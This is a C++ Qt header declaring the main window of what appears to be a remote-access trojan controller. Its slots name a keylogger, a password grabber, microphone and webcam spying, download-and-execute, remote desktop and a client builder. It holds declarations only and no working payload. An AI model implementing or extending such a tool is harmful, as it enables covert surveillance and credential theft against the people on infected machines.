#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include "ui_mainwindow.h"

namespace Neuron {
class Server;
}
class AbstractClient;
class ClientsModel;
class QSystemTrayIcon;
class WebServer;
class QLabel;
class MainWindow : public QMainWindow, private Ui::MainWindow
{
    Q_OBJECT
    QSystemTrayIcon *_tray;
    Neuron::Server *_server;
    ClientsModel *_model;
//    AbstractClient *_currentClient;

//    typedef QList<QAction*> Actions;
//    QMap<QString, Actions> _platformActions;
    QTranslator *translator;
    QTranslator *qtTranslator = nullptr;

    WebServer *webServer;

    QLabel *connectionLabel;

public:
    explicit MainWindow(QWidget *parent = nullptr);
    ~MainWindow();
    void installTranslator(const QString &lang);

protected:
    void changeEvent(QEvent *e);
    void enableActions(const QStringList &features = QStringList());

private slots:
    void on_tableView_activated(const QModelIndex &index);
    void on_tableView_clicked(const QModelIndex &index);
    void on_actionTaskManager_triggered();
    void on_actionMessageBox_triggered();
    void on_actionStartupManager_triggered();
    void on_actionCli_triggered();
    void on_actionScreenShot_triggered();
    void on_actionFileManager_triggered();
    void on_actionOpenUrl_triggered();
    void on_actionWebcam_triggered();
    void on_actionFileTransfer_triggered();
    void on_actionClose_triggered();
    void on_actionAbout_triggered();
    void on_actionEnglish_triggered();
    void on_actionFarsi_triggered();
    void on_actionSystem_informations_triggered();
    void on_actionRemote_desktop_triggered();
    void on_actionSocks_proxy_triggered();
    void on_tableView_customContextMenuRequested(const QPoint &pos);
    void on_actionShutdown_triggered();
    void on_actionReboot_triggered();
    void on_actionLock_triggered();
    void on_actionUnlock_triggered();
    void on_actionKeylogger_triggered();
    void on_actionLogOut_triggered();
    void on_actionBrowser_tabs_triggered();
    void on_actionMake_client_triggered();
    void on_actionSettings_triggered();
    void on_actionRegistry_triggered();
    void on_actionLogs_triggered();
    void on_actionIcon_view_triggered();
    void on_actionList_view_triggered();

    void on_actionMinrophone_spy_triggered();

    void on_listView_customContextMenuRequested(const QPoint &pos);

    void on_listView_clicked(const QModelIndex &index);

    void on_actionPassword_grabber_triggered();

    void on_actionDownload_execute_triggered();

private:
    void initTray();
    void initActions();
    void initServer();
    void initModel();
    void initWebServer();
    void initStatusBar();
    AbstractClient *client() const;
    void showDialog();

protected:
    void closeEvent(QCloseEvent *event);
};

#endif // MAINWINDOW_H
